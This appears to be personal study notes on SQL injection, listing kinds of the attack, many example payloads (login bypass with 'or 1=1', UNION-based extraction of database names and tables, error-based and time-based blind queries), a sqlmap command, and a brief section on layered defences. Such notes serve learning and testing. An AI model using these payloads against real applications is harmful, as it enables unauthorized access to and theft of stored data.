https://www.base64decode.org


SQL INjection ==> web security vulnerability that allows an attacker to interfere with the queries that an application makes to its db.
                = Able to access all the data that the application itself to access 
                = causes persistent chanegs to the applications content
                = Able to perform Dos or DDos Attacks

        --  ==> comment indicator in SQL
        + , or ASCII values 1=1 ; waitfor delay ('0:0:20') payload 


            ? Retrieving Hidden Data [ Access ]
            ? Subverting Application Logic  [ Validation ]
            ? Retrieving data from other db tables
            ? Examining the database
            ? Blind SQL injection Vulnerabilities
        
    First Order SQL Injection <== raises where the application takes user input from an HTTP request and incorporates the input into
                                  an SQL query in an unsafe way


    Second Order SQL Injection ==> Stored SQL Injection
                                 = fetch request from http and stores it for future use


            ? Syntax for String Concatenation
            ? Comments
            ? Batched / Stacked queries
            ? Platform-specific APIs
            ? Error Messages
            ? parametrized queries


        select * from login where username = '' and password = 'x' or 1 = 1;
        select * from login where username = '' -- 
        
        select user();
        select version();
        select database();
        select * from login where username = "sagar" or "1"="1" and password="bansal" or "1"="1";
        select * from login where username = "anything" or "1"="1" and password="anything" or "1"="1";
        select * from login where username = "sagar" or 1=1;#" and password ="anything";
        select * from login where username = "sagar" or 1=1;-- -" and password ="anything";
        select * from login where username = "sagar" or 1=1;/*" and password ="anything";  || needs to comment multi-line externally

                ' or 1=1;#  || use single & double quotes



                % In-band SQL Injections      <== able to get response from a website [ data | error ]
                        ! union-based Injection
                        ! error-based Injection

                % Inferential SQL Injections <== Not getting either error or data, just analyzing the behaviour of the application
                        ! Boolean-based Injection
                        ! Time-based Injection

                % Out of Band SQL Injections  


        select * from login union select database(),user(),version();
        select * from login order by 'number';

        select schema_name from information_schema.schemata;
        select table_name from information_schema.tables where table_schema = 'name';

                ?cat=2 union select 1,user(), 3,4,5,6,database(),8,version(),10,11
                ?cat=2 order by 'number'
                ?cat=2 union select 1,user(), 3,4,5,6,database(),8,schema_name,10,11 from information_schema.schemata#
                ?cat=2 union select 1,user(), 3,4,5,6,database(),8,table_name,10,11 from information_schema.tables where table_schema='name'#
                ?cat=2 union select 1,user(), 3,4,5,6,database(),8,group_concat(table_name),10,11 from information_schema.tables where table_schema='name'#

        select name, rand() from users;
        select name, rand(0) from users;
        select name, rand(0),round(rand(0)) from users;
        select name from users group by round(rand(0));
        select name from users group by round(rand(0)) having min(0);
        select name from users where name = 'sagar' or 1=1 group by round(rand(0)) having min(0);
        select name,concat(version()," ", user(), " ", database(), " ", round(rand(0))) from users;
 
                ?cat=2 or 1=1 group by round(rand(0)) having min(0)#
                ?cat=2 or 1=1 group by concat(version()," ", user(), " ", database(), " ", round(rand(0))) having min(0)#


        select * from login where id=1 and database()="sbva";
        select * from login where id=2 or database()="sbva"; 
        select * from login where id=2 or length(database())="1";
        select * from login where id=2 or substring(database(),1,1)="a";  || variable,character_index, number_of_characters
        select * from login where id=2 or database() like "%bv%";

                ?cat=2 and length(database())='number'#


        select * from login where name ="sagar" and if(database()="a",sleep(2),sleep(5))
        select * from login where name ="sagar" and if(length(database())="1",sleep(2),sleep(5)) || use >, <, >=, <=


                ! Semi Automated Tools 
                        @ Burp Suite   || portswigger.net

                !Fully Automated Tools
                        @sqlmap

                                sqlmap.py -hh
                                python sqlmap.py -u http://localhost/login.php --risk=3 --level=5
                                 

                ! Defending Against SQL injections 

                       @ Multi Layer Defence - 
                                ? Layer 1 - Secure Code
                                        % Input Validation
                                        % Parametrized Queries
                                        % Stored Procedures
                                        % Escaping
                                
                                ? Layer 2 - Host Based Web Application Firewall [ WAF ] || wordpress-cms

                                ? Layer 3 - Edge Sided Web Application Firewall [ WAF ] || cloud-services [ cloudflare ]

                                ? Other Layers -
                                        % Intrusion Detection System
                                        % Intrusion Prevention System
                                        % Application Delivery Controller
                                        % Security Orchestration Automation Response System
                                        % Manage Monitor Automation Response System


